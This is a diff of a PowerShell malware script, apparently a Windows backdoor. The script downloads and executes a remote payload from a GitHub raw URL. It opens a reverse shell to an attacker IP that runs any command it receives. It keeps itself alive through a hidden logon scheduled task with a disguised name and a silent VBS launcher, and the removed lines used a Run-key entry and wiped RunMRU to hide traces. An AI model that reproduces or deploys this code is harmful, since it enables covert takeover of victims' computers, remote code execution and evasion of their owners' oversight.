@@ -1,54 +1,45 @@
 # --- CONFIGURATION ---
-$Url = "https://raw.githubusercontent.com/thegostman/happy/refs/heads/main/happy.ps1"  # <--- PUT YOUR RAW LINK HERE
-$LHOST = "192.168.43.109"       # <--- PUT YOUR KALI IP HERE
+$Url = "https://raw.githubusercontent.com/thegostman/happy/refs/heads/main/happy.ps1"
+$LHOST = "192.168.43.109"
 $LPORT = 4444
+$TaskName = "WindowsSettingsSync"
 
-# --- 1. CREATE THE INVISIBLE LAUNCHER (VBS) ---
-# We save this file to a hidden system folder so the user never sees it
-$FileName = "system_update.vbs"
-$Path = "$env:APPDATA\Microsoft\Windows\Templates\$FileName"
+# --- 1. THE STEALTH PERSISTENCE (Scheduled Task) ---
+# This creates a task that runs every time ANY user logs in, completely hidden.
+if (!(Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
+    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$env:APPDATA\launcher.vbs`""
+    $Trigger = New-ScheduledTaskTrigger -AtLogOn
+    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force
+}
 
-# This VBS code does two things:
-# 1. It waits 60 seconds at startup (to let Wi-Fi connect).
-# 2. It runs PowerShell completely invisibly (WindowStyle 0).
+# --- 2. CREATE THE SILENT LAUNCHER ---
 $VBSCode = @"
-WScript.Sleep(60000)
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$Url')", 0, False
+WshShell.Run "powershell.exe -NoP -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$Url')", 0, False
 "@
+$VBSPath = "$env:APPDATA\launcher.vbs"
+Set-Content -Path $VBSPath -Value $VBSCode -Force
 
-# Write the VBS file to the disk
-Set-Content -Path $Path -Value $VBSCode -Force
-
-# --- 2. PERSISTENCE (Run the VBS, not PowerShell) ---
-# We point the registry to 'wscript.exe' which runs VBS files silently
-$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$Name = "WindowsHealthMonitor"
-$Value = "wscript.exe `"$Path`""
-
-Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
-
-# --- 3. CLEANUP (Hide tracks) ---
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
-
-# --- 4. IMMEDIATE CONNECTION (The Beacon Loop) ---
-# This runs immediately so you don't have to wait for a reboot
+# --- 3. THE BEACON LOOP ---
 while($true) {
     try {
         $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
         $stream = $client.GetStream()
         $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
-        $writer.WriteLine("--- TARGET CONNECTED (VBS INSTALLED) ---")
+        $writer.WriteLine("--- SYSTEM ONLINE: NO ICON MODE ---")
         $reader = New-Object System.IO.StreamReader($stream)
         
         while($client.Connected) {
             $writer.Write("PS " + (Get-Location).Path + "> ")
             $line = $reader.ReadLine()
-            if($line -eq "exit") { break }
+            if ($null -eq $line -or $line -eq "exit") { break }
             $out = (Invoke-Expression $line 2>&1 | Out-String)
             $writer.WriteLine($out)
         }
         $client.Close()
     }
-    catch { Start-Sleep -Seconds 10 }
+    catch {
+        Start-Sleep -Seconds 10 # Reliable retry every 10s
+    }
 }
